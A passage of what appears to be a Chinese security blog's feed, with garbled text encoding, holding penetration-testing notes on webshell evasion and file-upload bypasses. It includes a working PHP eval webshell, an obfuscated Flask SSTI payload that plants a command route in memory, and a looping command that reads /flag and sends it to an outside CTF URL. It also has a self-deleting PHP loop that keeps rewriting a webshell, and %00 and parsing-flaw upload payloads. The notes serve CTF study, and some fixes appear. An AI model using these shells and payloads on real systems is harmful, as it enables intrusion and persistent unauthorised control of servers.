title="ç»•è¿‡æµé‡"></a>ç»•è¿‡æµé‡</h6><p>æµ‹è¯•æ—¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;xxx&quot;</span>) <span class="comment">#å‘½ä»¤æ‰§è¡Œé™åˆ¶</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517211700124.png" alt="image-20230517211700124"></p><p>å¯¹æµé‡è¿›è¡Œä¸€ä¸ª<code>base64</code>åŠ å¯†å³å¯</p><p><code>webshell</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>èšå‰‘</p><p>ç¼–ç å™¨</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data[pwd] = Buffer.<span class="keyword">from</span>(data[<span class="string">&#x27;_&#x27;</span>]).<span class="title function_ invoke__">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br></pre></td></tr></table></figure><p>é€‰æ‹©ç¼–ç å™¨</p><p><img src="/../images/image-20230517211627163.png" alt="image-20230517211627163"></p><h5 id="webshellå…æ€"><a href="#webshellå…æ€" class="headerlink" title="webshellå…æ€"></a>webshellå…æ€</h5><p>wafæ£€æµ‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å†…å®¹ã€åˆ›å»ºæ—¥æœŸã€æ–‡ä»¶å¤§å°ã€é€šä¿¡æµé‡ç‰¹å¾</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯¹äºé™æ€å¼•æ“çš„ç»•è¿‡ï¼Œå¯ä»¥é€šè¿‡æ‹†åˆ†å…³é”®è¯ã€</span><br><span class="line">åŠ å…¥èƒ½å¤Ÿå¼•å‘è§£æå¹²æ‰°çš„ç•¸å½¢å­—ç¬¦ç­‰;</span><br><span class="line"></span><br><span class="line">è€Œå¯¹äºåŠ¨æ€å¼•æ“ï¼Œéœ€è¦åˆ†æå®ƒè·Ÿè¸ªäº†å“ªäº›è¾“å…¥</span><br><span class="line">ç‚¹ï¼Œåˆæ˜¯å¦‚ä½•è·Ÿè¸ªå˜é‡çš„ï¼Œæœ€ç»ˆæ˜¯åœ¨å“ªäº›å‡½æ•°çš„å“ªäº›å‚æ•°å‘½ä¸­äº†æ¶æ„æ ·æœ¬è§„åˆ™</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å„ç§æ··æ·†ï¼ˆç¼–ç åŠ å¯†ï¼Œè¿›åˆ¶è½¬æ¢ï¼Œååºåˆ—åŒ–...ï¼‰</span><br><span class="line">ä¿¡æ¯å·®ç»•è¿‡ï¼ˆåŠ å…¥å¤–éƒ¨å› ç´ åæ‰æ˜¯webshelï¼Œé‡å­WEBshellğŸ˜‹ï¼‰</span><br></pre></td></tr></table></figure><p>ä¼ ç»Ÿwebshell</p><p>å­¦ä¹ ï¼š</p><p><a href="https://cloud.tencent.com/developer/article/1625439">WebShellé€šç”¨å…æ€çš„æ€è€ƒ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p><p><a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md">https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/</a></p><p>æ”¶é›†ï¼š</p><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><p>æ— æ–‡ä»¶è½åœ°â€“å†…å­˜é©¬</p><p>python</p><p><a href="https://xz.aliyun.com/t/10933#toc-4">https://xz.aliyun.com/t/10933#toc-4</a></p><p>é€šè¿‡æ³¨å†Œè·¯ç”±å¤„ç†æ¥å®ç°æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flask 1.x æ˜¯å¯ä»¥çš„</span></span><br><span class="line">?name=&#123;&#123;get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0065\u0076\u0061\u006c&quot;</span>)(<span class="string">&quot;app.add_ur&quot;</span>+<span class="string">&quot;l_rule(&#x27;/khaz&#x27;, &#x27;khaz&#x27;, la&quot;</span>+<span class="string">&quot;mbda :__imp&quot;</span>+<span class="string">&quot;ort__(&#x27;o&quot;</span>+<span class="string">&quot;s&#x27;).po&quot;</span>+<span class="string">&quot;pen(_request_c&quot;</span>+<span class="string">&quot;tx_stack.to&quot;</span>+<span class="string">&quot;p.re&quot;</span>+<span class="string">&quot;quest.args.get(&#x27;cmd&#x27;)).re&quot;</span>+<span class="string">&quot;ad())&quot;</span>,&#123;<span class="string">&#x27;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&quot;</span>),<span class="string">&#x27;app&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070&quot;</span>)&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/khaz?cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230531192216503.png" alt="image-20230531192216503"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åƒµå°¸è¿›ç¨‹ è®°å¾—ç¼–ç </span></span><br><span class="line">system(<span class="string">&quot;python3 -c \&quot;while 1:exec(\\\&quot;flag=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()[:-1];print(flag);io=__import__(&#x27;requests&#x27;).get(&#x27;https://ctf.bugku.com/pvp/submit.html?token=67c0d48c49a89cc434b2f95da944e759&amp;flag=&#x27;+flag);print(io.content);__import__(&#x27;time&#x27;).sleep(600);\\\&quot;);\&quot; &amp; &quot;</span>);</span><br></pre></td></tr></table></figure><p>åƒµå°¸è¿›ç¨‹ ï¼š å­è¿›ç¨‹å…ˆäºçˆ¶è¿›ç¨‹é€€å‡ºï¼Œçˆ¶è¿›ç¨‹åˆæ²¡æœ‰å¤„ç†å­è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ï¼Œæ­¤æ—¶å­è¿›ç¨‹å°±ä¼šç§°ä¸ºåƒµå°¸è¿›ç¨‹ã€‚</p><p>çˆ¶è¿›ç¨‹é€šè¿‡<code>sleep(600)</code>ä¿è¯å­è¿›ç¨‹ä¼˜å…ˆäºçˆ¶è¿›ç¨‹é€€å‡º</p><p><a href="https://blog.csdn.net/Freshduke/article/details/111544319">(77æ¡æ¶ˆæ¯) pythonåƒµå°¸è¿›ç¨‹çš„äº§ç”Ÿå’Œåƒµå°¸è¿›ç¨‹è‡ªåŠ¨å¤„ç†_pipeå¯¼è‡´åƒµå°¸è¿›ç¨‹_Jimmy-TONGçš„åšå®¢-CSDNåšå®¢</a></p><p>php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]) ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;snert.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡å†…å­˜é©¬å¯åŠ¨ååˆ é™¤æ–‡ä»¶æœ¬èº«ä¹‹å‰ï¼Œä½¿ä»£ç åœ¨å†…å­˜ä¸­æ‰§è¡Œæ­»å¾ªç¯ï¼Œä½¿ç®¡ç†å‘˜æ— æ³•åˆ é™¤å†…å­˜é©¬ï¼Œè¾¾åˆ°æƒé™ç»´æŒçš„ç›®çš„ã€‚</p><p>JAVA</p><p>æ”¾åœ¨javaå®‰å…¨é‡Œ</p><h5 id="æµé‡ç»•è¿‡"><a href="#æµé‡ç»•è¿‡" class="headerlink" title="æµé‡ç»•è¿‡"></a>æµé‡ç»•è¿‡</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¼±ç‰¹å¾ï¼šHTTP Header</span><br><span class="line">requestå’Œresponseå†…å®¹</span><br></pre></td></tr></table></figure><p>å‚è€ƒä¹‹å‰HWçœ‹çš„æ–‡ç« </p><ul><li><p>å“¥æ–¯æ‹‰</p><p><a href="https://www.freebuf.com/sectool/285693.html">ã€åŸåˆ›ã€‘å“¥æ–¯æ‹‰GodzillaåŠ å¯†æµé‡åˆ†æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p></li><li><p>å†°è</p><p><a href="https://xz.aliyun.com/t/2744">åˆ©ç”¨åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†å®ç°æ–°å‹ä¸€å¥è¯æœ¨é©¬ä¹‹Javaç¯‡ - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://www.secpulse.com/archives/195173.html">å†°èV4.0æµé‡åˆ†æåˆ°æ”»é˜²æ£€æµ‹ - SecPulse.COM | å®‰å…¨è„‰æ</a></p><p><a href="https://xz.aliyun.com/t/12453">å†°è4.0è‡ªå®šä¹‰åŠ å¯† - å…ˆçŸ¥ç¤¾åŒº</a></p></li><li><p>èšå‰‘</p><p><a href="https://www.yuque.com/antswordproject/antsword/yuakxl">https://www.yuque.com/antswordproject/antsword/yuakxl</a></p></li></ul><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://xz.aliyun.com/t/368">https://xz.aliyun.com/t/368</a></p><p><a href="https://xz.aliyun.com/t/10515">https://xz.aliyun.com/t/10515</a></p><p>[Bypass WAF Cookbook - MayIKissYou](<a href="https://wooyun.js.org/drops/Bypass">https://wooyun.js.org/drops/Bypass</a> WAF Cookbook.html)</p><p><a href="https://www.anquanke.com/post/id/203880">https://www.anquanke.com/post/id/203880</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¼æ´å±å®³â€“æ”»å‡»é¢"><a href="#æ¼æ´å±å®³â€“æ”»å‡»é¢" class="headerlink" title="æ¼æ´å±å®³â€“æ”»å‡»é¢"></a>æ¼æ´å±å®³â€“æ”»å‡»é¢</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Webshellç±»ï¼šè„šæœ¬æ–‡ä»¶</span><br><span class="line">XSSç±»ï¼šsvgï¼Œhtmlï¼Œpdfæ–‡ä»¶,å¦‚æœåç«¯ä¸ºnodejsï¼Œå¯ä»¥xss to rce</span><br><span class="line">SSRFç±»ï¼šPDF</span><br><span class="line">XXEç±»ï¼šdocxã€xlsxï¼Œsvg</span><br><span class="line">RCEç±»ï¼špharæ–‡ä»¶ï¼Œé…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–æ”»å‡»</span><br><span class="line">æ–‡ä»¶è¦†ç›–ï¼šæ–‡ä»¶è·¯å¾„å¯æ§</span><br></pre></td></tr></table></figure><p><a href="https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf">PDFè§£æå™¨html&#x2F;XSS å®ç°SSRF - ç«çº¿ Zone-å®‰å…¨æ”»é˜²ç¤¾åŒº</a></p><h1 id="PHPç›¸å…³ä»£ç "><a href="#PHPç›¸å…³ä»£ç " class="headerlink" title="PHPç›¸å…³ä»£ç "></a>PHPç›¸å…³ä»£ç </h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x27;file&#x27;]æ˜¯Content-Dispositionä¸­nameçš„å€¼</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] å®¢æˆ·ç«¯æ–‡ä»¶åç§°</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] æ–‡ä»¶çš„MIMEç±»å‹       image/jpeg,image/png</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] æ–‡ä»¶å¤§å° å•ä½å­—èŠ‚</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] æ–‡ä»¶è¢«ä¸Šä¼ åå†æœåŠ¡å™¨ç«¯ä¸´æ—¶æ–‡ä»¶åï¼Œå¯ä»¥åœ¨php.iniä¸­æŒ‡å®š</span><br><span class="line">    </span><br><span class="line"><span class="comment"># åŠ å…¥æ–‡ä»¶å¤´ç»•è¿‡ï¼šGIF89a  </span></span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>()  å›¾ç‰‡å¤§å°</span><br><span class="line"><span class="title function_ invoke__">exif_imagetype</span>()  å›¾ç‰‡ç±»å‹</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è¿‡ç¨‹</p><blockquote><p>åœ¨æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œæ–‡ä»¶é»˜è®¤è¢«å‚¨å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸­ï¼Œè¿™æ—¶å¿…é¡»æŠŠä»–ä»ä¸´æ—¶ç›®å½•ä¸­åˆ é™¤æˆ–ç§»åŠ¨åˆ°å…¶ä»–åœ°æ–¹ï¼Œå¦åˆ™ï¼Œè„šæœ¬è¿è¡Œå®Œæ¯•åï¼Œè‡ªåŠ¨åˆ é™¤ä¸´æ—¶æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨<code>copyæˆ–</code>è€…<code>move_uploaded_file</code>ä¸¤ä¸ªå‡½æ•°ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">       <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h1><ul><li><p>ä¸­é—´ä»¶é…ç½®ä¸å½“ï¼Œå¯¼è‡´å¯ä»¥è§£æå…¶ä»–è„šæœ¬åç¼€</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line">.phpx  .phtml</span><br><span class="line">    </span><br><span class="line"><span class="comment"># jsp    </span></span><br><span class="line">.jsp .jspa .jsps .jspx </span><br><span class="line">    </span><br><span class="line"><span class="comment"># .net</span></span><br><span class="line">.asp  .asa .cdx  .cer  .aspx .asmx  .ashx</span><br></pre></td></tr></table></figure></li><li><p>å¯ä»¥ä¸Šä¼ ç›¸å…³é…ç½®æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Apache</span></span><br><span class="line">.htaccess  .user.ini</span><br></pre></td></tr></table></figure></li></ul><p>â€‹<a href="https://blog.csdn.net/solitudi/article/details/116666720">CTF.htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“_.htaccess ctf_Y4tackerçš„åšå®¢-CSDNåšå®¢</a></p><ul><li><p>è¿‡æ»¤ä¸å½“</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ç‚¹ç»•è¿‡ã€ç©ºæ ¼ç»•è¿‡ã€åç¼€åŒå†™ç»•è¿‡ã€åç¼€å¤§å°å†™ç»•è¿‡</span><br></pre></td></tr></table></figure></li></ul><h1 id="å›¾ç‰‡ç™½åå•ç»•è¿‡"><a href="#å›¾ç‰‡ç™½åå•ç»•è¿‡" class="headerlink" title="å›¾ç‰‡ç™½åå•ç»•è¿‡"></a>å›¾ç‰‡ç™½åå•ç»•è¿‡</h1><h3 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­"></a>%00æˆªæ–­</h3><h4 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h4><ul><li>phpç‰ˆæœ¬&lt;5.3.4</li><li>magic_quotes_gpcå…³é—­</li><li>ä¿å­˜çš„æ–‡ä»¶åå¯æ§</li></ul><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure><p>åç«¯ä½¿ç”¨<code>move_uploaded_file</code>æ¥ç§»åŠ¨æ–‡ä»¶ï¼Œ<code>move_uploaded_file</code>å‡½æ•°åº•å±‚ä¸ºcè¯­è¨€ï¼Œé‡åˆ°0x00ä¼šæˆªæ–­ï¼ˆå­—ç¬¦ä¸²ç»“æŸæ ‡å¿—ï¼‰</p><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?save_path=../upload/shell.php%<span class="number">00</span></span><br><span class="line"></span><br><span class="line">filename=shell.jpg</span><br></pre></td></tr></table></figure><h3 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h3><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">    <span class="comment"># move_uploaded_fileæˆåŠŸåæ‰åˆ¤æ–­æ˜¯å¦åˆæ³•</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æœåŠ¡ç«¯å…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶å†™å…¥ï¼Œå†åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œé€šè¿‡æ¡ä»¶ç«äº‰åœ¨æ–‡ä»¶åˆ é™¤å‰è®¿é—®webshellå†™å…¥æ–°çš„webshellå³å¯ã€‚</p><h3 id="è§£ææ¼æ´"><a href="#è§£ææ¼æ´" class="headerlink" title="è§£ææ¼æ´"></a>è§£ææ¼æ´</h3><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><ul><li><p>5.x  , 6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ–‡ä»¶å¤¹è§£ææ¼æ´</span><br><span class="line">ä¼šå°† *.asp/ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å½“æˆAspè§£æ</span><br></pre></td></tr></table></figure></li><li><p>6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># åˆ†å·æˆªæ–­æ¼æ´</span><br><span class="line">é»˜è®¤ä¼šå°† *.asp;.jpg æ­¤ç§æ ¼å¼çš„æ–‡ä»¶åï¼Œå½“æˆAspè§£æï¼ŒåŸç†æ˜¯æœåŠ¡å™¨é»˜è®¤ä¸è§£æ; å·åŠå…¶åé¢çš„å†…å®¹ï¼Œç›¸å½“äºæˆªæ–­ã€‚</span><br></pre></td></tr></table></figure></li></ul><p>ä¿®å¤æ–¹æ¡ˆï¼šIISæœåŠ¡å™¨æœ¬èº«ç¼ºé™·ï¼Œå‡çº§ç‰ˆæœ¬&#x2F;æ‰“è¡¥ä¸</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>äº§ç”ŸåŸå› ï¼š<code>FastCGI</code>ä¸<code>PHP</code>å¯¹PATHçš„è§£æä¸åŒ</p><ul><li><p>æ–‡ä»¶ç±»å‹é”™è¯¯è§£ææ¼æ´</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/example.gif/.php</span><br></pre></td></tr></table></figure><p>ä¿®å¤ï¼šåœ¨php.iniä¸­<code>fix_pathinfo=0</code></p></li><li><p>ç©ºå­—èŠ‚è§£ææ¼æ´ï¼ˆCVE-2013-4547ï¼‰</p><p>å—å½±å“ç‰ˆæœ¬ï¼š0.841<del>1.4.3&#x2F;1.5.0</del>1.5.7</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info.jpg%20%00.php</span><br></pre></td></tr></table></figure><p>ä¿®å¤ï¼šå‡çº§ç‰ˆæœ¬</p></li></ul><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><ul><li><p>ä»å·¦åˆ°å³è§£ææ¼æ´</p><p>é…ç½®ä¸å½“<code>AddHandler application/x-httpd-php .php</code></p><p>Apacheä¼šä»å·¦å‘å³å¯»æ‰¾æ‰€æœ‰å¯ä»¥è¢«è¯†åˆ«çš„æ‰©å±•åï¼Œç„¶åä»¥æœ€åä¸€ä¸ªå¯è¯†åˆ«çš„æ‰©å±•åä¸ºå‡†è¿›è¡Œè§£æã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xxxx.php.xyz</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™æœ€åä¸€ä¸ªå¯è¯†åˆ«çš„æ‰©å±•ä¸º.phpï¼Œä¼šå°†å…¶ä½œä¸ºphpæ–‡ä»¶è¿›è¡Œè§£æï¼Œè½»æ¾ç»•è¿‡é»‘åå•ã€‚</p></li><li><p>HTTPDæ¢è¡Œè§£ææ¼æ´</p><p>é…ç½®ä¸­çš„æ­£åˆ™ç¼ºé™·</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;[^ .]+\.php$&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼ä¸­$ä¸ä»…åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾ä½ç½®ï¼Œä¹Ÿå¯ä»¥åŒ¹é…\n æˆ– \rï¼Œä»è€Œå¯¼è‡´å¯ä»¥ä¸Šä¼ <code>.php\n</code>ç»•è¿‡é»‘åå•æ ¡éªŒï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥è¢«ä½œä¸ºPHPæ–‡ä»¶è§£æã€‚ï¼ˆä¸èƒ½æ˜¯<code>.php\r\n</code>ï¼‰</p></li></ul><p>ä¿®å¤ï¼šå› ä¸ºApacheçš„è§£ææ¼æ´æ˜¯ç”±äºç•¸å½¢æ‰©å±•åå’Œç•¸å½¢æ–‡ä»¶åå¯¼è‡´çš„ï¼Œæ‰€ä»¥ä½¿ç”¨ç™½åå•ï¼Œå¹¶å¯¹æ–‡ä»¶é‡å‘½åï¼Œæ–‡ä»¶å°±ä¸ä¼šå­˜åœ¨ç•¸å½¢å­—ç¬¦å’Œå¤šæ‰©å±•åçš„æƒ…å†µã€‚</p><p>å‚è€ƒå¦‚ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]ä¼šè‡ªåŠ¨æŠŠæ¢è¡Œå»æ‰</span></span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span 